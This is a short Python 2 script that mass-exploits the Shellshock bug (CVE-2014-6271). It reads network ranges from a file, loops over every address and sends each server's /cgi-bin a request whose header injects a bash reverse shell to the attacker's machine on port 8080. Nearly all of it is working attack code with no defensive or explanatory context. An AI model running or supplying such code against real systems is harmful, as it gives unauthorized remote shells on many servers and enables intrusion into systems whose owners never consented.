#
#CVE-2014-6271 cgi-bin reverse shell
#

 

import httplib,urllib,sys
from IPy import IP
 

with open('iptxt.txt','r') as hostfile:
    for line in hostfile:
        try:
            network = line.strip('\n\r\t')
            print network
            ip = IP(network)
            print ip
            for x in ip:
                print x
                try:
                    conn = httplib.HTTPConnection(str(x))
                    reverse_shell="() { :;};/bin/bash -i >& /dev/tcp/(system IP)/8080 0>&1"
                    headers = {"Content-type": "application/x-www-form-urlencoded",
                    "test":reverse_shell }

                    conn.request("GET","/cgi-bin",headers=headers)
                    res = conn.getresponse()
                    print res.status, res.reason
                    data = res.read()

                    print sys 
                    print data
                except:
                    print ("there was an error unable to query", x)
                    pass
        except:
            print ('There was an error')
            pass
                

